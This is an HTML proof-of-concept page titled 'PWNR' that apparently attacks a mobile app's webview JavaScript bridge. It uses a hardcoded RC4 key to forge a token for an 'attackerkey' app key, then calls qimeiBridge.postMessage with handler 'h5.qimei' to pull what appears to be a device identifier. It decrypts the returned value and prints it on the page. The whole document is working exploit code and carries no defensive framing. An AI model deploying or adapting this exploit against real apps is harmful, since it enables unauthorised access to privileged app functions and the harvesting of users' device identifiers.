<!DOCTYPE html><html><head><meta charset="utf-8"><title>PWNR</title>
<style>body{background:#fff;color:#000;font:13px monospace;word-break:break-all}</style></head>
<body><div id="out">START</div>
<script>
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;');}
function w(t){document.getElementById('out').innerHTML += '<br>' + esc(t);}
w('URL=' + location.href);
// RC4 (self-inverse)
function rc4(key, data){
  var S=[], i, j=0, x, out=[];
  for(i=0;i<256;i++) S[i]=i;
  for(i=0;i<256;i++){ j=(j+S[i]+key[i%key.length])&0xff; x=S[i]; S[i]=S[j]; S[j]=x; }
  i=0; j=0;
  for(var k=0;k<data.length;k++){
    i=(i+1)&0xff; j=(j+S[i])&0xff;
    x=S[i]; S[i]=S[j]; S[j]=x;
    out.push(data[k]^S[(S[i]+S[j])&0xff]);
  }
  return out;
}
function str2ba(s){ var a=[]; for(var i=0;i<s.length;i++) a.push(s.charCodeAt(i)&0xff); return a; }
function ba2hex(a){ return a.map(function(b){return ('0'+b.toString(16)).slice(-2);}).join(''); }
function hex2ba(h){ var a=[]; for(var i=0;i<h.length;i+=2) a.push(parseInt(h.substr(i,2),16)); return a; }
function ba2str(a){ return a.map(function(b){return String.fromCharCode(b);}).join(''); }

var KEY = str2ba('35b4cfe6f7eae7acbd7bace522d0db54');
window.qimeiCallback = function(h){
  w('QIMEI_CB_RAW=' + String(h).slice(0,400));
  try {
    var dec = ba2str(rc4(KEY, hex2ba(String(h))));
    w('QIMEI_DECRYPTED=' + dec.slice(0,400));
  } catch(e){ w('DEC_ERR=' + e.message); }
};
setTimeout(function(){
  // 自检：E("{}") 应为 6ef6
  var selftest = ba2hex(rc4(KEY, str2ba('{}')));
  w('SELFTEST E({})=' + selftest + ' (expect 6ef6)');
  var appKey = 'attackerkey';
  var time = String(Math.floor(Date.now()/1000));
  var plain = appKey + '-' + time;
  var token = ba2hex(rc4(KEY, str2ba(plain)));
  w('PLAIN=' + plain);
  w('TOKEN=' + token.slice(0,60) + '...');
  try {
    var ret = qimeiBridge.postMessage(JSON.stringify({handlerName:'h5.qimei', appKey:appKey, time:time, token:token}));
    w('RET=' + String(ret).slice(0,200));
  } catch(e){ w('ERR=' + e.message); }
  setTimeout(function(){ w('DONE'); }, 3000);
}, 1000);
</script></body></html>
